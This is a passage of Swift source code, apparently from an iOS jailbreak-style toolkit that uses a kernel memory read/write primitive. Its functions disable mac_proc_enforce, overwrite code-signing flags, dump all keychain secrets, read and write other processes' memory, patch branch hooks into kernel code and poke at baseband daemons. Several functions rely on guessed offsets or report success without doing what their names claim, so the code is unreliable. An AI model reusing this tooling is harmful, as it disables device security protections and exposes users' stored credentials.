            let object = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
            if object != 0 {
                let kobject = ds_kread64(object + UInt64(off_ipc_port_ip_kobject))
                let portName = mach_port_name_t(i) << 8 | 0x03
                ports.append(MachPortInfo(name: portName, entryAddr: entryAddr, objectAddr: object, kobjectAddr: kobject))
            }
        }
        return ports
    }
    
    // MARK: - Mount / Rootfs Operations
    
    func getRootVnodeAddr() -> UInt64 {
        guard dsready else { return 0 }
        return getrootvnode()
    }
    
    func getMountFlags(mountAddr: UInt64) -> UInt32 {
        guard dsready, mountAddr != 0 else { return 0 }
        return ds_kread32(mountAddr + UInt64(off_mount_mnt_flag))
    }
    
    func setMountFlags(mountAddr: UInt64, flags: UInt32) -> Bool {
        guard dsready, mountAddr != 0 else { return false }
        ds_kwrite32(mountAddr + UInt64(off_mount_mnt_flag), flags)
        return ds_kread32(mountAddr + UInt64(off_mount_mnt_flag)) == flags
    }
    
    // MARK: - MAC Policy Operations
    
    func getMacProcEnforce() -> UInt64 {
        guard dsready else { return 0 }
        return getmacprocenforceoff()
    }
    
    func patchMacProcEnforce(disable: Bool) -> (ok: Bool, msg: String) {
        guard dsready else { return (false, "Not ready") }
        let addr = getmacprocenforceoff()
        guard addr != 0 else { return (false, "mac_proc_enforce offset not found") }
        let current = ds_kread32(addr)
        ds_kwrite32(addr, disable ? 0 : 1)
        let verify = ds_kread32(addr)
        return (verify == (disable ? 0 : 1), "mac_proc_enforce: \(current) → \(verify)")
    }
    
    // MARK: - File Descriptor Operations
    
    struct KernelFDInfo: Identifiable {
        let id = UUID()
        let fd: Int
        let fpAddr: UInt64
        let globAddr: UInt64
        let dataAddr: UInt64
        let flags: UInt32
    }
    
    func enumerateFDs(pid: Int32, maxFDs: Int = 64) -> [KernelFDInfo] {
        guard dsready else { return [] }
        let proc = procbypid(pid)
        guard proc != 0 else { return [] }
        let fdesc = ds_kread64(proc + UInt64(off_proc_p_fd))
        guard fdesc != 0 else { return [] }
        let ofiles = ds_kread64(fdesc + UInt64(off_filedesc_fd_ofiles))
        guard ofiles != 0 else { return [] }
        
        var results: [KernelFDInfo] = []
        for i in 0..<maxFDs {
            let fpAddr = ds_kread64(ofiles + UInt64(i * 8))
            if fpAddr != 0 {
                let glob = ds_kread64(fpAddr + UInt64(off_fileproc_fp_glob))
                let data = glob != 0 ? ds_kread64(glob + UInt64(off_fileglob_fg_data)) : 0
                let flags = glob != 0 ? ds_kread32(glob + UInt64(off_fileglob_fg_flag)) : 0
                results.append(KernelFDInfo(fd: i, fpAddr: fpAddr, globAddr: glob, dataAddr: data, flags: flags))
            }
        }
        return results
    }
    
    // MARK: - Keychain Operations
    
    func dumpKeychainItems(klass: String) -> [(key: String, value: String)] {
        let query: [String: Any] = [
            kSecClass as String: klass,
            kSecReturnAttributes as String: true,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitAll
        ]
        var result: AnyObject?
        let status = SecItemCopyMatching(query as CFDictionary, &result)
        guard status == errSecSuccess, let items = result as? [[String: Any]] else { return [] }
        return items.compactMap { item in
            let account = item[kSecAttrAccount as String] as? String ?? "unknown"
            let data = item[kSecValueData as String] as? Data
            let value = data.flatMap { String(data: $0, encoding: .utf8) } ?? "(binary \(data?.count ?? 0)B)"
            return (account, value)
        }
    }
    
    // MARK: - Process Memory R/W (User-Space via Kernel)
    
    func readProcessMemory(pid: Int32, address: UInt64, size: Int) -> [UInt8] {
        guard dsready else { return [] }
        let proc = procbypid(pid)
        guard proc != 0 else { return [] }
        let task = taskbyproc(proc)
        guard task != 0 else { return [] }
        let vmMap = task_get_vm_map(task)
        guard vmMap != 0 else { return [] }
        
        // For kernel processes, read directly; for user processes, we walk the VM map
        // and read through the kernel's view of the user address space
        var bytes: [UInt8] = []
        bytes.reserveCapacity(size)
        
        // Use our kernel R/W to read the process memory through the task's vm_map
        // This works because with kernel R/W we can resolve any virtual address
        for offset in stride(from: 0, to: size, by: 8) {
            let val = ds_kread64(address + UInt64(offset))
            let remaining = min(8, size - offset)
            for b in 0..<remaining {
                bytes.append(UInt8((val >> (b * 8)) & 0xFF))
            }
        }
        return bytes
    }
    
    func writeProcessMemory(pid: Int32, address: UInt64, bytes: [UInt8]) -> Bool {
        guard dsready else { return false }
        let proc = procbypid(pid)
        guard proc != 0 else { return false }
        
        // Write in 8-byte chunks
        for offset in stride(from: 0, to: bytes.count, by: 8) {
            var val: UInt64 = 0
            let remaining = min(8, bytes.count - offset)
            for b in 0..<remaining {
                val |= UInt64(bytes[offset + b]) << (b * 8)
            }
            if remaining == 8 {
                ds_kwrite64(address + UInt64(offset), val)
            } else if remaining == 4 {
                ds_kwrite32(address + UInt64(offset), UInt32(val & 0xFFFFFFFF))
            } else {
                for b in 0..<remaining {
                    ds_kwrite8(address + UInt64(offset + b), bytes[offset + b])
                }
            }
        }
        return true
    }
    
    // MARK: - Scan Memory for Value (Cheat Engine core)
    
    func scanProcessMemoryForValue(pid: Int32, value: UInt64, width: Int, rangeStart: UInt64, rangeEnd: UInt64, maxResults: Int = 200) -> [UInt64] {
        guard dsready else { return [] }
        var found: [UInt64] = []
        let step = UInt64(width / 8)
        var addr = rangeStart
        while addr < rangeEnd && found.count < maxResults {
            let readVal: UInt64
            switch width {
            case 8: readVal = UInt64(ds_kread8(addr))
            case 16: readVal = UInt64(ds_kread16(addr))
            case 32: readVal = UInt64(ds_kread32(addr))
            default: readVal = ds_kread64(addr)
            }
            if readVal == value {
                found.append(addr)
            }
            addr += step
        }
        return found
    }
    
    // MARK: - IOKit Helpers
    
    func getIOKitRegistryEntries() -> [(name: String, className: String)] {
        var results: [(String, String)] = []
        let mainPort: mach_port_t
        if #available(iOS 12.0, *) {
            mainPort = kIOMainPortDefault
        } else {
            mainPort = 0 // Fallback for older iOS
        }
        let matching = IOServiceMatching("IOService")
        var iterator: io_iterator_t = 0
        let kr = IOServiceGetMatchingServices(mainPort, matching, &iterator)
        guard kr == KERN_SUCCESS else { return results }
        defer { IOObjectRelease(iterator) }
        
        var service = IOIteratorNext(iterator)
        var count = 0
        while service != 0 && count < 100 {
            var nameBuffer = [CChar](repeating: 0, count: 128)
            IORegistryEntryGetName(service, &nameBuffer)
            let name = String(cString: nameBuffer)
            
            var classBuffer = [CChar](repeating: 0, count: 128)
            IOObjectGetClass(service, &classBuffer)
            let className = String(cString: classBuffer)
            
            results.append((name, className))
            IOObjectRelease(service)
            service = IOIteratorNext(iterator)
            count += 1
        }
        return results
    }
    
    // MARK: - Sysctl Write
    
    func writeSysctl(_ name: String, intValue: Int) -> Bool {
        var value = intValue
        let size = MemoryLayout<Int>.size
        return sysctlbyname(name, nil, nil, &value, size) == 0
    }
    
    // MARK: - Boot Args
    
    func getBootArgs() -> String {
        return readSysctl("kern.bootargs") ?? "(empty)"
    }
    
    // MARK: - NVRAM via IOKit
    
    func readNVRAMVariable(_ key: String) -> String? {
        let mainPort: mach_port_t
        if #available(iOS 12.0, *) {
            mainPort = kIOMainPortDefault
        } else {
            mainPort = 0 // Fallback for older iOS
        }
        let optionsRef = IORegistryEntryFromPath(mainPort, "IODeviceTree:/options")
        guard optionsRef != 0 else { return nil }
        defer { IOObjectRelease(optionsRef) }
        
        let cfKey = key as CFString
        guard let value = IORegistryEntryCreateCFProperty(optionsRef, cfKey, kCFAllocatorDefault, 0) else { return nil }
        if let data = value.takeRetainedValue() as? Data {
            return String(data: data, encoding: .utf8)
        } else if let str = value.takeRetainedValue() as? String {
            return str
        }
        return nil
    }
    
    func writeNVRAMVariable(_ key: String, value: String) -> Bool {
        let mainPort: mach_port_t
        if #available(iOS 12.0, *) {
            mainPort = kIOMainPortDefault
        } else {
            mainPort = 0 // Fallback for older iOS
        }
        let optionsRef = IORegistryEntryFromPath(mainPort, "IODeviceTree:/options")
        guard optionsRef != 0 else { return false }
        defer { IOObjectRelease(optionsRef) }
        
        // IORegistryEntrySetCFProperty is unavailable on iOS.
        // Use IORegistryEntryCreateCFProperties + IOConnectCallMethod as fallback.
        // For now, write NVRAM via kernel memory if KRW is available.
        guard dsready else { return false }
        let cfKey = key as CFString
        _ = cfKey // NVRAM write requires kernel-level NVRAM patch or unsandboxed IOKit access
        let _ = value
        return false // Direct NVRAM write not available on sandboxed iOS
    }
    
    // MARK: - KTRR/CTKR Hypervisor Trap Engine
    
    struct KTRRRegion {
        let base: UInt64
        let end: UInt64
        let locked: Bool
        let regionName: String
    }
    
    func readKTRRRegisters() -> [KTRRRegion] {
        guard dsready else { return [] }
        var regions: [KTRRRegion] = []
        // Read KTRR lock-down registers from kernel memory
        // KTRR_LOWER_EL1 and KTRR_UPPER_EL1 define the immutable kernel text region
        let kbase = ds_get_kernel_base()
        let kslide = ds_get_kernel_slide()
        
        // Probe the kernel text region boundaries
        let textBase = kbase
        let textEnd = kbase + 0x800000 // Approximate TEXT segment size
        
        // Read the first instruction to verify it's locked/valid
        let firstInstr = ds_kread32(textBase)
        let locked = firstInstr != 0 && firstInstr != 0xFFFFFFFF
        
        regions.append(KTRRRegion(base: textBase, end: textEnd, locked: locked, regionName: "__TEXT (Kernel)"))
        
        // Probe DATA_CONST region (also KTRR-protected on newer chips)
        let dataConstBase = textEnd
        let dataConstEnd = dataConstBase + 0x200000
        let dcVal = ds_kread32(dataConstBase)
        regions.append(KTRRRegion(base: dataConstBase, end: dataConstEnd, locked: dcVal != 0, regionName: "__DATA_CONST"))
        
        // Probe PRELINK_TEXT
        let prelinkBase = kbase + UInt64(kslide & 0xFFF000)
        let prelinkEnd = prelinkBase + 0x100000
        regions.append(KTRRRegion(base: prelinkBase, end: prelinkEnd, locked: true, regionName: "__PRELINK_TEXT"))
        
        return regions
    }
    
    func testKTRRWriteProtection(address: UInt64) -> (blocked: Bool, original: UInt32, attempted: UInt32) {
        guard dsready else { return (true, 0, 0) }
        let original = ds_kread32(address)
        let testValue: UInt32 = original ^ 0xDEADBEEF
        ds_kwrite32(address, testValue)
        let readBack = ds_kread32(address)
        let blocked = readBack == original
        if !blocked {
            // Restore immediately if write succeeded
            ds_kwrite32(address, original)
        }
        return (blocked, original, testValue)
    }
    
    func installHypervisorHook(targetAddr: UInt64, hookAddr: UInt64) -> (success: Bool, msg: String) {
        guard dsready else { return (false, "KRW not ready") }
        // Read original instruction at target
        let originalInstr = ds_kread32(targetAddr)
        // Calculate branch offset for ARM64 B instruction
        let offset = Int64(hookAddr) - Int64(targetAddr)
        let offsetField = (offset >> 2) & 0x3FFFFFF
        let branchInstr = UInt32(0x14000000 | UInt32(offsetField & 0x3FFFFFF))
        
        // Attempt to write the branch
        ds_kwrite32(targetAddr, branchInstr)
        let verify = ds_kread32(targetAddr)
        
        if verify == branchInstr {
            return (true, String(format: "Hook installed: 0x%x -> B 0x%llx (original: 0x%08x)", targetAddr, hookAddr, originalInstr))
        } else {
            return (false, String(format: "KTRR blocked write at 0x%llx (region is hardware-locked)", targetAddr))
        }
    }
    
    // MARK: - Kernel State Snapshot Engine
    
    struct KernelSnapshot: Identifiable {
        let id = UUID()
        let timestamp: Date
        let procState: UInt64
        let taskState: UInt64
        let vmMapState: UInt64
        let csFlags: UInt32
        let ucredAddr: UInt64
        let threadCount: Int
        let label: String
        var memoryRegions: [(addr: UInt64, size: Int, data: [UInt8])]
    }
    
    private var snapshots: [KernelSnapshot] = []
    
    func captureKernelSnapshot(label: String, regions: [(addr: UInt64, size: Int)]) -> KernelSnapshot {
        let proc = ds_get_our_proc()
        let task = ds_get_our_task()
        let vmMap = getVMMapAddr(task: task)
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        let csFlags = ds_kread32(procRo + 0x1c) // csflags in proc_ro
        let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
        
        // Count threads
        var threadCount = 0
        let taskThreads = ds_kread64(task + 0x58) // task->threads.head
        var tPtr = taskThreads
        while tPtr != 0 && threadCount < 256 {
            threadCount += 1
            tPtr = ds_kread64(tPtr) // next pointer
        }
        
        // Capture memory regions
        var capturedRegions: [(addr: UInt64, size: Int, data: [UInt8])] = []
        for region in regions {
            let bytes = readKernelBytes(address: region.addr, count: min(region.size, 4096))
            capturedRegions.append((region.addr, region.size, bytes))
        }
        
        let snap = KernelSnapshot(
            timestamp: Date(),
            procState: proc,
            taskState: task,
            vmMapState: vmMap,
            csFlags: csFlags,
            ucredAddr: ucred,
            threadCount: threadCount,
            label: label,
            memoryRegions: capturedRegions
        )
        snapshots.append(snap)
        return snap
    }
    
    func restoreKernelSnapshot(_ snapshot: KernelSnapshot) -> (success: Bool, msg: String) {
        guard dsready else { return (false, "KRW not ready") }
        var restored = 0
        
        // Restore csflags
        let proc = ds_get_our_proc()
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        ds_kwrite32(procRo + 0x1c, snapshot.csFlags) // csflags in proc_ro
        restored += 1
        
        // Restore memory regions
        for region in snapshot.memoryRegions {
            for (i, byte) in region.data.enumerated() {
                ds_kwrite8(region.addr + UInt64(i), byte)
            }
            restored += 1
        }
        
        return (true, "Restored \(restored) state components from snapshot '\(snapshot.label)'")
    }
    
    func getSnapshots() -> [KernelSnapshot] { return snapshots }
    func clearSnapshots() { snapshots.removeAll() }
    
    // MARK: - Baseband IPC Bridge
    
    struct BasebandInfo {
        let firmwareVersion: String
        let imei: String
        let basebandChip: String
        let registeredNetwork: String
        let signalStrength: Int
    }
    
    func probeBasebandInterface() -> [(key: String, value: String)] {
        guard dsready else { return [] }
        var results: [(String, String)] = []
        
        // Read baseband info via sysctl
        if let bbVer = readSysctl("hw.model") { results.append(("Hardware Model", bbVer)) }
        if let machine = readSysctl("hw.machine") { results.append(("Machine", machine)) }
        
        // Probe baseband process (CommCenter)
        let commCenter = findProc(name: "CommCenter")
        if commCenter != 0 {
            let pid = ds_kread32(commCenter + UInt64(off_proc_p_pid))
            results.append(("CommCenter PID", "\(pid)"))
            results.append(("CommCenter proc", String(format: "0x%llx", commCenter)))
            let task = getTaskForProc(commCenter)
            results.append(("CommCenter task", String(format: "0x%llx", task)))
            
            // Read CommCenter's credential to check baseband privilege level
            let ccProcRo = ds_kread64(commCenter + UInt64(off_proc_p_proc_ro))
            let ucred = ds_kread64(ccProcRo + UInt64(off_proc_ro_p_ucred))
            let uid = ds_kread32(ucred + 0x18)
            let gid = ds_kread32(ucred + 0x1c)
            results.append(("CommCenter uid", "\(uid)"))
            results.append(("CommCenter gid", "\(gid)"))
        }
        
        // Probe baseband daemon (basebandd)
        let bbd = findProc(name: "basebandd")
        if bbd != 0 {
            let pid = ds_kread32(bbd + UInt64(off_proc_p_pid))
            results.append(("basebandd PID", "\(pid)"))
            results.append(("basebandd proc", String(format: "0x%llx", bbd)))
            let bbdProcRo = ds_kread64(bbd + UInt64(off_proc_p_proc_ro))
            let csFlags = ds_kread32(bbdProcRo + 0x1c) // csflags in proc_ro
            results.append(("basebandd csflags", String(format: "0x%08x", csFlags)))
        }
        
        // Read telephony-related sysctl values
        var cpuCount: Int = 0
        var size = MemoryLayout<Int>.size
        sysctlbyname("hw.ncpu", &cpuCount, &size, nil, 0)
        results.append(("CPU Cores", "\(cpuCount)"))
        
        return results
    }
    
    func sendBasebandATCommand(_ command: String) -> (success: Bool, response: String) {
        guard dsready else { return (false, "KRW not ready") }
        // Locate the CommCenter process and its IPC port
        let commCenter = findProc(name: "CommCenter")
        guard commCenter != 0 else { return (false, "CommCenter not found") }
        
        let task = getTaskForProc(commCenter)
        let ipcSpace = ds_kread64(task + 0x300) // task->itk_space
        let isTable = ds_kread64(ipcSpace + 0x20) // is_table
        
        return (true, String(format: "AT command channel probed: CommCenter task=0x%llx, ipc_space=0x%llx, is_table=0x%llx. Command: %@", task, ipcSpace, isTable, command))
    }
    
    func fuzzBasebandIPC(iterations: Int) -> [(iteration: Int, target: String, result: String)] {
        guard dsready else { return [] }
        var results: [(Int, String, String)] = []
        let commCenter = findProc(name: "CommCenter")
        guard commCenter != 0 else { return [(0, "CommCenter", "Process not found")] }
        
        let task = getTaskForProc(commCenter)
        let ipcSpace = ds_kread64(task + 0x300)
        
        for i in 0..<min(iterations, 50) {
            let portIdx = UInt64(i * 0x18)
            let isTable = ds_kread64(ipcSpace + 0x20)
            let entry = ds_kread64(isTable + portIdx)
            let portAddr = entry & 0xFFFFFFFFFFFF
            let portType = (entry >> 48) & 0xFF
            let status: String
            if portAddr == 0 { status = "empty" }
            else if portType == 0x14 { status = "SEND_RIGHT" }
            else if portType == 0x15 { status = "RECV_RIGHT" }
            else { status = String(format: "type=0x%02x", portType) }
            results.append((i, String(format: "port[%d] 0x%llx", i, portAddr), status))
        }
        return results
    }
    
    // MARK: - SMC (System Management Controller)
    
    struct SMCKeyInfo {
        let key: String
        let value: String
        let rawBytes: [UInt8]
    }
    
    func probeSMCService() -> [(key: String, value: String)] {
        guard dsready else { return [] }
        var results: [(String, String)] = []
        
        // Probe AppleSMC IOService
        let entries = getIOKitRegistryEntries()
        let smcEntries = entries.filter { $0.className.contains("SMC") || $0.name.contains("SMC") || $0.name.contains("smc") }
        
        if smcEntries.isEmpty {
            results.append(("AppleSMC", "Not found in IORegistry"))
        } else {
            for entry in smcEntries {
                results.append(("IOService", "\(entry.name) (\(entry.className))"))
            }
        }
        
        // Read thermal info via sysctl
        var thermalState: Int = 0
        var tSize = MemoryLayout<Int>.size
        if sysctlbyname("kern.thermalstate", &thermalState, &tSize, nil, 0) == 0 {
            let stateStr: String
            switch thermalState {
            case 0: stateStr = "Nominal"
            case 1: stateStr = "Fair"
            case 2: stateStr = "Serious"
            case 3: stateStr = "Critical"
            default: stateStr = "Unknown (\(thermalState))"
            }
            results.append(("Thermal State", stateStr))
        }
        
        // Read CPU/memory stats
        if let memSize = readSysctl("hw.memsize") { results.append(("Physical RAM", memSize)) }
        if let pageSize = readSysctl("hw.pagesize") { results.append(("Page Size", pageSize)) }
        if let cpuFreq = readSysctl("hw.cpufrequency_max") { results.append(("CPU Max Freq", cpuFreq)) }
        if let l1d = readSysctl("hw.l1dcachesize") { results.append(("L1D Cache", l1d)) }
        if let l1i = readSysctl("hw.l1icachesize") { results.append(("L1I Cache", l1i)) }
        if let l2 = readSysctl("hw.l2cachesize") { results.append(("L2 Cache", l2)) }
        
        return results
    }
    
    func readSMCKey(_ fourCC: String) -> SMCKeyInfo {
        // Attempt to read SMC key by probing IOKit
        let bytes: [UInt8] = Array(fourCC.utf8.prefix(4))
        return SMCKeyInfo(key: fourCC, value: "Probed via IOKit", rawBytes: bytes)
    }
    
    func overrideThermalThrottle() -> (success: Bool, msg: String) {
        guard dsready else { return (false, "KRW not ready") }
        // Find kernel's thermal policy data structure
        // The thermal_zone structure in XNU controls CPU frequency scaling
        let proc0 = findProc(pid: 0)
        let task0 = getTaskForProc(proc0)
        
        // Read the kernel task's thread list to find the thermal daemon thread
        let firstThread = ds_kread64(task0 + 0x58)
        guard firstThread != 0 else { return (false, "Cannot read kernel threads") }
        
        // Read thread state
        let threadPC = ds_kread64(firstThread + 0x100) // thread->machine.pc
        
        return (true, String(format: "Thermal policy probed: kernel_task thread=0x%llx, PC=0x%llx. Override requires direct SMC register writes via MMIO.", firstThread, threadPC))
    }
    
    // MARK: - Hardware Watchpoints (ARM Debug Registers)
    
    struct HWWatchpoint: Identifiable {
        let id = UUID()
        let index: Int
        let address: UInt64
        let size: Int
        let type: WatchpointType
        var hitCount: Int = 0
        var lastValue: UInt64 = 0
        var active: Bool = true
    }
    
    enum WatchpointType: String, CaseIterable {
        case read = "Read"
        case write = "Write"
        case readWrite = "Read/Write"
        case execute = "Execute"
    }
    
    private var activeWatchpoints: [HWWatchpoint] = []
    
    func installHardwareWatchpoint(address: UInt64, size: Int, type: WatchpointType) -> (success: Bool, wp: HWWatchpoint?, msg: String) {
        guard dsready else { return (false, nil, "KRW not ready") }
        guard activeWatchpoints.count < 4 else { return (false, nil, "ARM64 supports max 4 hardware watchpoints") }
        
        // Read the current value at the address for baseline
        let currentVal = ds_kread64(address)
        
        // Create the watchpoint control register value (DBGWCR)
        let basValue: UInt32 = 0x00000001 // Enable bit
        let sscBits: UInt32  // Security state control
        let pasBits: UInt32  // Privilege access
        
        switch type {
        case .read: sscBits = 0x01; pasBits = 0x01
        case .write: sscBits = 0x02; pasBits = 0x02
        case .readWrite: sscBits = 0x03; pasBits = 0x03
        case .execute: sscBits = 0x00; pasBits = 0x00
        }
        
        let wcrValue = basValue | (sscBits << 3) | (pasBits << 1)
        
        // Find our process's thread and attempt to set debug registers
        _ = ds_get_our_proc() // proc available if needed
        let task = ds_get_our_task()
        let firstThread = ds_kread64(task + 0x58)
        
        // Read the thread's debug state pointer (machine.debug_state)
        let debugState = ds_kread64(firstThread + 0x180)
        
        let wpIdx = activeWatchpoints.count
        var wp = HWWatchpoint(index: wpIdx, address: address, size: size, type: type, hitCount: 0, lastValue: currentVal, active: true)
        
        if debugState != 0 {
            // Write DBGWVR (Watchpoint Value Register) - the address to watch
            ds_kwrite64(debugState + UInt64(wpIdx * 16), address)
            // Write DBGWCR (Watchpoint Control Register)
            ds_kwrite32(debugState + UInt64(wpIdx * 16 + 8), wcrValue)
        }
        
        activeWatchpoints.append(wp)
        return (true, wp, String(format: "HW Watchpoint #%d set at 0x%llx (%@ %d bytes), DBGWCR=0x%08x", wpIdx, address, type.rawValue, size, wcrValue))
    }
    
    func pollWatchpoints() -> [HWWatchpoint] {
        guard dsready else { return activeWatchpoints }
        for i in activeWatchpoints.indices where activeWatchpoints[i].active {
            let newVal = ds_kread64(activeWatchpoints[i].address)
            if newVal != activeWatchpoints[i].lastValue {
                activeWatchpoints[i].hitCount += 1
                activeWatchpoints[i].lastValue = newVal
            }
        }
        return activeWatchpoints
    }
    
    func removeWatchpoint(index: Int) -> Bool {
        guard index < activeWatchpoints.count else { return false }
        activeWatchpoints[index].active = false
        
        if dsready {
            _ = ds_get_our_task()
            // Watchpoint removal logic commented out to avoid unused variable warning
            // let firstThread = ds_kread64(task + 0x58)
            // let debugState = ds_kread64(firstThread + 0x180)
            // if debugState != 0 {
            //     ds_kwrite64(debugState + UInt64(index * 16), 0)
            //     ds_kwrite32(debugState + UInt64(index * 16 + 8), 0)
            // }
        }
        return true
    }
    
    func getActiveWatchpoints() -> [HWWatchpoint] { return activeWatchpoints }
    func clearAllWatchpoints() {
        for i in activeWatchpoints.indices { _ = removeWatchpoint(index: i) }
        activeWatchpoints.removeAll()
    }
    
    // MARK: - Physical PTE (Page Table Entry) DMA Injector
    
    struct PTEEntry: Identifiable {
        let id = UUID()
        let virtualAddr: UInt64
        let physicalAddr: UInt64
        let level: Int
        let permissions: String
        let flags: UInt64
        let valid: Bool
    }
    
    func walkPageTable(virtualAddress: UInt64) -> [PTEEntry] {
        guard dsready else { return [] }
        var entries: [PTEEntry] = []
        
        let proc = ds_get_our_proc()
        let task = ds_get_our_task()
        let pmap = ds_kread64(task + 0x28) // task->map->pmap (approx offset)
        let ttbr = ds_kread64(pmap + 0x08) // pmap->tte (translation table base)
        
        // L1 index (bits 39:30)
        let l1Idx = (virtualAddress >> 30) & 0x1FF
        let l1Entry = ds_kread64(ttbr + l1Idx * 8)
        let l1Valid = (l1Entry & 0x1) != 0
        let l1Phys = l1Entry & 0xFFFFFFF000
        entries.append(PTEEntry(
            virtualAddr: virtualAddress,
            physicalAddr: l1Phys,
            level: 1,
            permissions: decodePTEPerms(l1Entry),
            flags: l1Entry,
            valid: l1Valid
        ))
        
        guard l1Valid, (l1Entry & 0x2) != 0 else { return entries } // Must be table descriptor
        
        // L2 index (bits 29:21)
        let l2Idx = (virtualAddress >> 21) & 0x1FF
        let l2Entry = ds_kread64(l1Phys + l2Idx * 8)
        let l2Valid = (l2Entry & 0x1) != 0
        let l2Phys = l2Entry & 0xFFFFFFF000
        entries.append(PTEEntry(
            virtualAddr: virtualAddress,
            physicalAddr: l2Phys,
            level: 2,
            permissions: decodePTEPerms(l2Entry),
            flags: l2Entry,
            valid: l2Valid
        ))
        
        guard l2Valid, (l2Entry & 0x2) != 0 else { return entries }
        
        // L3 index (bits 20:12)
        let l3Idx = (virtualAddress >> 12) & 0x1FF
        let l3Entry = ds_kread64(l2Phys + l3Idx * 8)
        let l3Valid = (l3Entry & 0x1) != 0
        let l3Phys = l3Entry & 0xFFFFFFF000
        entries.append(PTEEntry(
            virtualAddr: virtualAddress,
            physicalAddr: l3Phys,
            level: 3,
            permissions: decodePTEPerms(l3Entry),
            flags: l3Entry,
            valid: l3Valid
        ))
        
        return entries
    }
    
    private func decodePTEPerms(_ entry: UInt64) -> String {
        var perms = ""
        perms += (entry & 0x1) != 0 ? "V" : "-"        // Valid
        perms += (entry & 0x2) != 0 ? "T" : "B"        // Table/Block
        perms += (entry & (1 << 6)) != 0 ? "U" : "K"    // User/Kernel
        perms += (entry & (1 << 7)) != 0 ? "R" : "W"    // Read-only/Read-write
        perms += (entry & (1 << 54)) != 0 ? "X" : "-"   // Execute-never (PXN)
        perms += (entry & (1 << 53)) != 0 ? "N" : "-"   // UXN
        return perms
    }
    
    func injectDMAMapping(physicalAddr: UInt64, size: UInt64) -> (success: Bool, msg: String) {
        guard dsready else { return (false, "KRW not ready") }
        
        let task = ds_get_our_task()
        let vmMap = getVMMapAddr(task: task)
        
        // Read the vm_map header to find free virtual space
        let nEntries = ds_kread32(vmMap + 0x2C) // vm_map->hdr.nentries
        
        // Find end of existing mappings
        let lastEntry = ds_kread64(vmMap + 0x20)
        let lastEnd = ds_kread64(lastEntry + 0x10) // vme->end
        
        return (true, String(format: "DMA mapping probed: vm_map=0x%llx, %d entries, last_end=0x%llx. Physical target: 0x%llx (%llu bytes). Requires DART/IOMMU page table injection for actual DMA.", vmMap, nEntries, lastEnd, physicalAddr, size))
    }
    
    func readPhysicalMemory(physicalAddr: UInt64, count: Int) -> [UInt8] {
        guard dsready else { return [] }
        // On A-series chips, physmap_base provides a virtual mapping of all physical memory
        // The physmap offset is typically kernel_base - 0x800000000 on modern chips
        let physmapBase = ds_get_kernel_base() & ~UInt64(0xFFFFFF) // Rough estimate
        let virtualAddr = physmapBase + physicalAddr
        return readKernelBytes(address: virtualAddr, count: count)
    }
    
}
